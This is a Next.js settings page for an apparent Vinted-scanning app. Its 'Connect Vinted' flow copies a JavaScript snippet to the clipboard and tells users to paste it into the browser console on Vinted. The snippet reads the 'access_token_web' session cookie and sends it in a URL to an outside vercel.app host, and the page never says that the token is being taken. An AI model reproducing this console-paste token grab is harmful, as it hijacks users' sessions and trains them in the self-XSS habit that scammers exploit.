'use client'
import { useEffect, useState, Suspense } from 'react'
import { useSearchParams } from 'next/navigation'
import Navigation from '@/components/Navigation'

const DOMAINS = ['www.vinted.de', 'www.vinted.at', 'www.vinted.fr', 'www.vinted.co.uk']

const SCRIPT = `var t=document.cookie.match(/(?:^|; )access_token_web=([^;]*)/);if(t)window.location.href='https://truesource-web-pink.vercel.app/settings?vtoken='+encodeURIComponent(decodeURIComponent(t[1]))+'&vdomain='+location.hostname;else alert('Please log in to Vinted first!');`

interface DomainStatus { connected: boolean; email?: string; connectedAt?: number }

function timeAgo(ms: number) {
  const diff = Date.now() - ms
  const mins = Math.floor(diff / 60000)
  if (mins < 1) return 'just now'
  if (mins < 60) return `${mins}m ago`
  const h = Math.floor(mins / 60)
  if (h < 24) return `${h}h ago`
  return `${Math.floor(h / 24)}d ago`
}

function SettingsInner() {
  const params = useSearchParams()
  const [status,   setStatus]   = useState<Record<string, DomainStatus>>({})
  const [loading,  setLoading]  = useState(true)
  const [autoMsg,  setAutoMsg]  = useState<{ text: string; ok: boolean } | null>(null)
  const [step,     setStep]     = useState<'idle' | 'waiting'>('idle')
  const [copied,   setCopied]   = useState(false)

  async function loadStatus() {
    const r = await fetch('/api/vinted-connect')
    if (r.ok) setStatus(await r.json())
    setLoading(false)
  }

  useEffect(() => {
    const vtoken = params.get('vtoken')
    const vdomain = params.get('vdomain')
    if (!vtoken) return
    const d = vdomain ? `www.${vdomain.replace(/^www\./, '')}` : 'www.vinted.de'
    setAutoMsg({ text: 'Connecting…', ok: true })
    fetch('/api/vinted-connect', {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ domain: d, accessToken: vtoken }),
    }).then(r => r.json()).then(data => {
      if (data.ok) {
        setAutoMsg({ text: 'Vinted connected! ✓', ok: true })
        setStep('idle')
        loadStatus()
        window.history.replaceState({}, '', '/settings')
      } else {
        setAutoMsg({ text: data.error || 'Failed — please try again', ok: false })
        setStep('idle')
      }
    }).catch(() => { setAutoMsg({ text: 'Connection failed', ok: false }); setStep('idle') })
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  useEffect(() => { loadStatus() }, [])

  function handleConnect() {
    navigator.clipboard.writeText(SCRIPT).catch(() => {})
    setCopied(true)
    setTimeout(() => setCopied(false), 3000)
    window.open('https://www.vinted.de', '_blank')
    setStep('waiting')
  }

  async function disconnect(d: string) {
    await fetch('/api/vinted-connect', { method: 'DELETE', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ domain: d }) })
    await loadStatus()
  }

  const connectedDomains = DOMAINS.filter(d => status[d]?.connected)

  return (
    <div style={{ minHeight: '100vh', background: 'var(--bg)' }}>
      <Navigation />
      <div className="page" style={{ maxWidth: 520 }}>

        <div style={{ marginBottom: 28 }}>
          <h1 style={{ fontSize: 24, fontWeight: 800, color: 'var(--text)', margin: 0, letterSpacing: '-0.02em' }}>Connect Vinted</h1>
          <p style={{ fontSize: 13, color: 'var(--text3)', marginTop: 4 }}>Link your Vinted account to start scanning automatically.</p>
        </div>

        {/* Auto-connect result */}
        {autoMsg && (
          <div style={{ padding: '14px 18px', borderRadius: 12, marginBottom: 20, fontSize: 14, fontWeight: 600, background: autoMsg.ok ? 'rgba(61,245,200,0.08)' : 'rgba(248,113,113,0.08)', border: `1.5px solid ${autoMsg.ok ? 'rgba(61,245,200,0.25)' : 'rgba(248,113,113,0.25)'}`, color: autoMsg.ok ? 'var(--accent)' : 'var(--danger)', display: 'flex', alignItems: 'center', gap: 10 }}>
            {autoMsg.ok
              ? <svg width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
              : <svg width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
            }
            {autoMsg.text}
          </div>
        )}

        {/* Connected accounts */}
        {!loading && connectedDomains.length > 0 && (
          <div style={{ background: 'var(--card)', border: '1.5px solid var(--border)', borderRadius: 14, padding: '18px 20px', marginBottom: 20 }}>
            <p style={{ fontSize: 12, fontWeight: 700, color: 'var(--text)', marginBottom: 12, letterSpacing: '0.04em' }}>CONNECTED</p>
            {connectedDomains.map(d => {
              const s = status[d]!
              return (
                <div key={d} style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '10px 12px', background: 'rgba(61,245,200,0.04)', borderRadius: 10, border: '1px solid rgba(61,245,200,0.15)' }}>
                  <div style={{ width: 8, height: 8, borderRadius: '50%', background: 'var(--accent)', boxShadow: '0 0 6px var(--accent)', flexShrink: 0 }} />
                  <div style={{ flex: 1 }}>
                    <div style={{ fontSize: 13, fontWeight: 600, color: 'var(--text)' }}>{d}</div>
                    <div style={{ fontSize: 11, color: 'var(--text3)', marginTop: 1 }}>{s.email || 'browser login'} · {s.connectedAt ? timeAgo(s.connectedAt) : ''}</div>
                  </div>
                  <button onClick={() => disconnect(d)} style={{ fontSize: 12, color: 'var(--danger)', background: 'none', border: 'none', cursor: 'pointer', padding: '4px 8px', borderRadius: 6 }}>Disconnect</button>
                </div>
              )
            })}
          </div>
        )}

        {/* Connect card */}
        <div style={{ background: 'var(--card)', border: '1.5px solid rgba(61,245,200,0.3)', borderRadius: 16, overflow: 'hidden' }}>

          {step === 'idle' && (
            <div style={{ padding: '32px 28px', textAlign: 'center' }}>
              <div style={{ width: 56, height: 56, borderRadius: 16, background: 'rgba(61,245,200,0.1)', border: '1.5px solid rgba(61,245,200,0.25)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 18px' }}>
                <svg width="26" height="26" fill="none" stroke="var(--accent)" strokeWidth="1.8" strokeLinecap="round" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
              </div>
              <p style={{ fontSize: 18, fontWeight: 800, color: 'var(--text)', margin: '0 0 8px', letterSpacing: '-0.01em' }}>Connect your Vinted account</p>
              <p style={{ fontSize: 13, color: 'var(--text3)', margin: '0 0 28px', lineHeight: 1.6 }}>Works with Google, Apple, Facebook — any login method</p>
              <button onClick={handleConnect} className="btn-primary" style={{ width: '100%', fontSize: 16, padding: '15px', borderRadius: 12 }}>
                <svg width="16" height="16" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
                Connect with Vinted
              </button>
            </div>
          )}

          {step === 'waiting' && (
            <div style={{ padding: '28px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 24 }}>
                <div style={{ width: 10, height: 10, borderRadius: '50%', background: '#fbbf24', boxShadow: '0 0 8px #fbbf24', flexShrink: 0 }} />
                <span style={{ fontSize: 14, fontWeight: 700, color: 'var(--text)' }}>Vinted is open in a new tab</span>
              </div>

              <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>

                {/* Step 1 */}
                <div style={{ display: 'flex', gap: 14 }}>
                  <div style={{ width: 28, height: 28, borderRadius: '50%', background: 'rgba(61,245,200,0.1)', border: '1.5px solid rgba(61,245,200,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 12, fontWeight: 800, color: 'var(--accent)', flexShrink: 0 }}>1</div>
                  <div style={{ paddingTop: 4 }}>
                    <p style={{ fontSize: 13, fontWeight: 700, color: 'var(--text)', margin: 0 }}>Log into Vinted in the new tab</p>
                    <p style={{ fontSize: 12, color: 'var(--text3)', marginTop: 2 }}>Use Google, Apple or any method</p>
                  </div>
                </div>

                {/* Step 2 */}
                <div style={{ display: 'flex', gap: 14 }}>
                  <div style={{ width: 28, height: 28, borderRadius: '50%', background: 'rgba(61,245,200,0.1)', border: '1.5px solid rgba(61,245,200,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 12, fontWeight: 800, color: 'var(--accent)', flexShrink: 0 }}>2</div>
                  <div style={{ paddingTop: 4 }}>
                    <p style={{ fontSize: 13, fontWeight: 700, color: 'var(--text)', margin: 0 }}>Press <kbd style={{ padding: '2px 7px', borderRadius: 4, border: '1.5px solid var(--border2)', background: 'var(--surface)', fontSize: 12, fontWeight: 700, fontFamily: 'monospace' }}>F12</kbd> → click <strong>Console</strong></p>
                  </div>
                </div>

                {/* Step 3 */}
                <div style={{ display: 'flex', gap: 14 }}>
                  <div style={{ width: 28, height: 28, borderRadius: '50%', background: 'rgba(61,245,200,0.1)', border: '1.5px solid rgba(61,245,200,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: 12, fontWeight: 800, color: 'var(--accent)', flexShrink: 0 }}>3</div>
                  <div style={{ flex: 1, paddingTop: 4 }}>
                    <p style={{ fontSize: 13, fontWeight: 700, color: 'var(--text)', margin: 0, marginBottom: 8 }}>
                      Paste <kbd style={{ padding: '2px 7px', borderRadius: 4, border: '1.5px solid var(--border2)', background: 'var(--surface)', fontSize: 12, fontWeight: 700, fontFamily: 'monospace' }}>Ctrl+V</kbd> → press <kbd style={{ padding: '2px 7px', borderRadius: 4, border: '1.5px solid var(--border2)', background: 'var(--surface)', fontSize: 12, fontWeight: 700, fontFamily: 'monospace' }}>Enter</kbd>
                    </p>
                    <div style={{ display: 'flex', gap: 8 }}>
                      <div style={{ flex: 1, padding: '8px 12px', borderRadius: 8, background: 'var(--bg)', border: '1px solid var(--border)', fontSize: 11, color: 'var(--text3)', fontFamily: 'monospace', overflow: 'hidden', whiteSpace: 'nowrap', textOverflow: 'ellipsis' }}>
                        {copied ? '✓ Copied to clipboard!' : SCRIPT.slice(0, 60) + '…'}
                      </div>
                      <button
                        onClick={() => { navigator.clipboard.writeText(SCRIPT); setCopied(true); setTimeout(() => setCopied(false), 2000) }}
                        style={{ padding: '8px 14px', borderRadius: 8, background: copied ? 'rgba(61,245,200,0.15)' : 'var(--surface)', border: `1px solid ${copied ? 'rgba(61,245,200,0.4)' : 'var(--border)'}`, color: copied ? 'var(--accent)' : 'var(--text3)', fontSize: 12, fontWeight: 600, cursor: 'pointer', flexShrink: 0, transition: 'all 0.15s' }}
                      >
                        {copied ? '✓' : 'Copy'}
                      </button>
                    </div>
                    <p style={{ fontSize: 11, color: 'var(--text3)', marginTop: 6 }}>The script was already copied when you clicked Connect ↑</p>
                  </div>
                </div>
              </div>

              <button onClick={() => setStep('idle')} style={{ marginTop: 20, background: 'none', border: 'none', color: 'var(--text3)', fontSize: 12, cursor: 'pointer', padding: 0 }}>← Start over</button>
            </div>
          )}
        </div>

      </div>
    </div>
  )
}

export default function SettingsPage() {
  return (
    <Suspense fallback={<div style={{ minHeight: '100vh', background: 'var(--bg)' }} />}>
      <SettingsInner />
    </Suspense>
  )
}
